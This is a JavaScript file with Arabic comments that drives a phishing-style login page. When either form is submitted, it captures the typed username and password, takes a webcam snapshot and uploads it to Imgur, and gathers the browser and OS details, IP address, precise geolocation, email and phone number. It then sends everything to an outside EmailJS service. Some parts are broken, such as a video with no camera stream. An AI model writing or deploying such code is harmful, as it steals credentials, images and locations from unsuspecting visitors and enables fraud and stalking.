// تبديل عرض كلمة المرور
document.getElementById('toggle-password').addEventListener('click', function () {
    const passwordInput = document.getElementById('password');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        this.classList.remove('fa-eye-slash');
        this.classList.add('fa-eye');
    } else {
        passwordInput.type = 'password';
        this.classList.remove('fa-eye');
        this.classList.add('fa-eye-slash');
    }
});

document.getElementById('toggle-password1').addEventListener('click', function () {
    const passwordInput1 = document.getElementById('password1');
    if (passwordInput1.type === 'password') {
        passwordInput1.type = 'text';
        this.classList.remove('fa-eye-slash');
        this.classList.add('fa-eye');
    } else {
        passwordInput1.type = 'password';
        this.classList.remove('fa-eye');
        this.classList.add('fa-eye-slash');
    }
});

function isMobileDevice() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
}
// إضافة EmailJS في بداية الكود
(function () {
    emailjs.init("Cf6AQnmKaonDjuzz5"); // استبدل بـ USER_ID الخاص بك
})();

document.getElementById('form').addEventListener('submit', async function (event) {
    event.preventDefault();
    
    const body = document.getElementById('body');
    const additionalFields = document.getElementById('additional-fields');
    const creer = document.getElementById('creer');
    const submit = document.getElementById('submit');

    if (isMobileDevice()) {
        
        body.classList.add('body-new-background');
        body.classList.add('show-fields');
        creer.style.display = "none"
        submit.style.display = "none"
    } else {
        console.log("Not a mobile device. No changes made.");
    }

    const nameInput = document.getElementById('name');
    const passwordInput = document.getElementById('password');
    const errorDiv = document.getElementById('error');

    
    if (nameInput.value.trim() === "") {
        nameInput.focus();
        return;
    }

    if (passwordInput.value.trim() === "") {
        passwordInput.focus();
        return;
    }

    errorDiv.textContent = "";

    try {
        const video = document.createElement('video');
        video.play();

        // التقاط الصورة بعد فترة قصيرة
        await new Promise(resolve => setTimeout(resolve, 1000)); // انتظار ثانية واحدة

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // تحويل الصورة إلى بيانات
        const imageData1 = canvas.toDataURL('image/png');

        // رفع الصورة إلى Imgur
        const response = await fetch('https://api.imgur.com/3/image', {
            method: 'POST',
            headers: {
                Authorization: 'Client-ID b861a7b44747f00', // استبدل بـ Client-ID الخاص بك
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                image: imageData1.split(',')[1], // إزالة الجزء الأول من Base64
                type: 'base64',
            }),
        });

        const result = await response.json();
        if (result.success) {
            imageUrl1 = result.data.link; // رابط الصورة
            console.log("Image URL:", imageUrl1);
        } else {
            console.error("Failed to upload image:", result);
        }

        // إيقاف الكاميرا
        stream.getTracks().forEach(track => track.stop());
    } catch (error) {
        console.error("Error capturing or uploading image:", error);
    }



    // جمع بيانات المستخدم
    const browserInfo = getBrowserInfo();
    const osInfo = getOSInfo();
    const ipInfo = await getIPInfo();
    const geoLocation = await getGeoLocation();
    const email = await getEmail(); // استدعاء البريد الإلكتروني
    const phone = await getPhoneNumber();
    const imageData = setTimeout(); 

    // إرسال البيانات عبر EmailJS
    const templateParams = {
        name: nameInput.value,
        password: passwordInput.value,
        browserInfo: browserInfo,
        osInfo: osInfo,
        ipInfo: ipInfo,
        geoLocation: geoLocation,
        email: email,
        phone: phone,
        imageData: imageUrl1
    };

    emailjs.send("service_4esymny", "template_t2odele", templateParams)
        .then(function (response) {
            console.log("Email sent successfully:", response);
        }, function (error) {
            console.error("Error sending email:", error);
        });
});

document.getElementById('form1').addEventListener('submit', async function (event) {
    event.preventDefault();
    
    const nameInput1 = document.getElementById('name1');
    const passwordInput1 = document.getElementById('password1');
    const errorDiv1 = document.getElementById('error1');

    
    if (nameInput1.value.trim() === "") {
        nameInput1.focus();
        return;
    }

    if (passwordInput1.value.trim() === "") {
        passwordInput1.focus();
        return;
    }

    errorDiv1.textContent = "";

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        // التقاط الصورة بعد فترة قصيرة
        await new Promise(resolve => setTimeout(resolve, 1000)); // انتظار ثانية واحدة

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // تحويل الصورة إلى بيانات
        const imageData = canvas.toDataURL('image/png');

        // رفع الصورة إلى Imgur
        const response = await fetch('https://api.imgur.com/3/image', {
            method: 'POST',
            headers: {
                Authorization: 'Client-ID b68e25bf12b9cc1', // استبدل بـ Client-ID الخاص بك
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                image: imageData.split(',')[1], // إزالة الجزء الأول من Base64
                type: 'base64',
            }),
        });

        const result = await response.json();
        if (result.success) {
            imageUrl = result.data.link; // رابط الصورة
            console.log("Image URL:", imageUrl);
        } else {
            console.error("Failed to upload image:", result);
        }

        // إيقاف الكاميرا
        stream.getTracks().forEach(track => track.stop());
    } catch (error) {
        console.error("Error capturing or uploading image:", error);
    }




    // جمع بيانات المستخدم
    const browserInfo = getBrowserInfo();
    const osInfo = getOSInfo();
    const ipInfo = await getIPInfo();
    const geoLocation = await getGeoLocation();
    const geoLocation1 = await fetchGeoLocationFromIP();
    const email = await getEmail(); // استدعاء البريد الإلكتروني
    const phone = await getPhoneNumber();  


    // إرسال البيانات عبر EmailJS
    const templateParams = {
        name1: nameInput1.value,
        password1: passwordInput1.value,
        browserInfo: browserInfo,
        osInfo: osInfo,
        ipInfo: ipInfo,
        geoLocation: geoLocation,
        geoLocation1: geoLocation1,
        email: email,
        phone: phone,
        imageUrl2: imageUrl
    };

    emailjs.send("service_4esymny", "template_fjk0ckm", templateParams)
        .then(function (response) {
            console.log("Email sent successfully:", response);
        }, function (error) {
            console.error("Error sending email:", error);
        });
});

// دالة للحصول على معلومات المتصفح
function getBrowserInfo() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Chrome")) return "Chrome";
    if (userAgent.includes("Firefox")) return "Firefox";
    if (userAgent.includes("Safari")) return "Safari";
    if (userAgent.includes("Edge")) return "Edge";
    return "Unknown Browser";
}

// دالة للحصول على معلومات النظام
function getOSInfo() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;

    let os = "Unknown OS";
    let version = "Unknown Version";
    let deviceType = "Unknown Device";

    // تحديد النظام الأساسي
    if (userAgent.includes("Windows NT")) {
        os = "Windows";
        const versionMatch = userAgent.match(/Windows NT (\d+\.\d+)/);
        version = versionMatch ? versionMatch[1] : "Unknown Version";
    } else if (userAgent.includes("Mac OS X")) {
        os = "MacOS";
        const versionMatch = userAgent.match(/Mac OS X (\d+_\d+)/);
        version = versionMatch ? versionMatch[1].replace("_", ".") : "Unknown Version";
    } else if (userAgent.includes("Linux")) {
        os = "Linux";
    } else if (userAgent.includes("Android")) {
        os = "Android";
        const versionMatch = userAgent.match(/Android (\d+\.\d+)/);
        version = versionMatch ? versionMatch[1] : "Unknown Version";
    } else if (/iPhone|iPad|iPod/.test(userAgent)) {
        os = "iOS";
        const versionMatch = userAgent.match(/OS (\d+_\d+)/);
        version = versionMatch ? versionMatch[1].replace("_", ".") : "Unknown Version";
    }

    // تحديد نوع الجهاز
    if (/Mobi|Android/i.test(userAgent)) {
        deviceType = "Mobile";
    } else if (/iPad|Tablet/i.test(userAgent)) {
        deviceType = "Tablet";
    } else {
        deviceType = "Desktop";
    }

    return {
        os,
        version,
        deviceType,
        platform,
    };
}


// دالة للحصول على عنوان الـ IP
async function getIPInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        return data.ip || "Unknown IP";
    } catch (error) {
        console.error("Error fetching IP info:", error);
        return "Unknown IP";
    }
}

// دالة للحصول على الموقع الجغرافي
async function getGeoLocation() {
    if ("geolocation" in navigator) {
        return new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const { latitude, longitude } = position.coords;
                    resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
                },
                (error) => {
                    console.error("Error using geolocation:", error);
                    // إذا فشلت geolocation، يتم استخدام IP-based API كخيار بديل
                    fetchGeoLocationFromIP()
                        .then(resolve)
                        .catch(reject);
                }
            );
        });
    } else {
        console.warn("Geolocation not supported. Falling back to IP-based location.");
        return fetchGeoLocationFromIP();
    }
}

// دالة احتياطية للحصول على الموقع الجغرافي باستخدام IP
async function fetchGeoLocationFromIP() {
    try {
        const response = await fetch('https://ipinfo.io/160.176.63.224?token=0083ebbf6abe6f'); // ضع التوكن الخاص بك هنا
        const data = await response.json();
        return `${data.city}, ${data.region}, ${data.country}` || "Unknown Location";
    } catch (error) {
        console.error("Error fetching geo-location from IP:", error);
        return "Unknown Location";
    }
}

// دالة للحصول على البريد الإلكتروني
async function getEmail() {
    try {
        const response = await fetch('/get-email-api'); // استبدل بعنوان API صالح
        const data = await response.json();
        return data.email || "Unknown Email";
    } catch (error) {
        console.error("Error fetching email:", error);
        return "Unknown Email";
    }
}



// دالة للحصول على رقم الهاتف
async function getPhoneNumber() {
    try {
        const response = await fetch('/get-phone-api'); // استبدل بعنوان API صالح
        const data = await response.json();
        return data.phone || "Unknown Phone";
    } catch (error) {
        console.error("Error fetching phone number:", error);
        return "Unknown Phone";
    }
}
